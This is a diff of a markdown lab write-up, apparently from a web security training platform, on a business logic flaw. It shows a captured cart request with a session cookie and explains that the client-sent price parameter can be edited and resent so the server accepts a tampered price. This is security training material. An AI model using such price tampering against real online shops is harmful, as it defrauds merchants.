@@ -22,23 +22,36 @@ we have to manipulate specific parameters in the request or so to test for the b
  
  ## Request 
  
-     POST /cart HTTP/1.1
-Host: 0a5d00c0038b8062c09a11d7009700cc.web-security-academy.net
-Cookie: session=VQHFrZjrndyN8kEb1ivgOD4X9YydBrGB
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 49
-Origin: https://0a5d00c0038b8062c09a11d7009700cc.web-security-academy.net
-Referer: https://0a5d00c0038b8062c09a11d7009700cc.web-security-academy.net/product?productId=1
-Upgrade-Insecure-Requests: 1
-Sec-Fetch-Dest: document
-Sec-Fetch-Mode: navigate
-Sec-Fetch-Site: same-origin
-Sec-Fetch-User: ?1
-Te: trailers
-Connection: close
+    POST /cart HTTP/1.1
+    Host: 0a5d00c0038b8062c09a11d7009700cc.web-security-academy.net
+    Cookie: session=VQHFrZjrndyN8kEb1ivgOD4X9YydBrGB
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 49
+    Origin: https://0a5d00c0038b8062c09a11d7009700cc.web-security-academy.net
+    Referer: https://0a5d00c0038b8062c09a11d7009700cc.web-security-academy.net/product?productId=1
+    Upgrade-Insecure-Requests: 1
+    Sec-Fetch-Dest: document
+    Sec-Fetch-Mode: navigate
+    Sec-Fetch-Site: same-origin
+    Sec-Fetch-User: ?1
+    Te: trailers
+    Connection: close
 
-productId=1&redir=PRODUCT&quantity=1&price=133700
+    productId=1&redir=PRODUCT&quantity=1&price=133700
+    
+ ## Note That Show Price in request 
+ 
+     productId=1&redir=PRODUCT&quantity=1&price=133700   
+     
+ So Change The Price and sand the request in server, like server is accept the request, here business logic vulnerabilities
+ 
+ 
+     
+     
+     
+     
+     
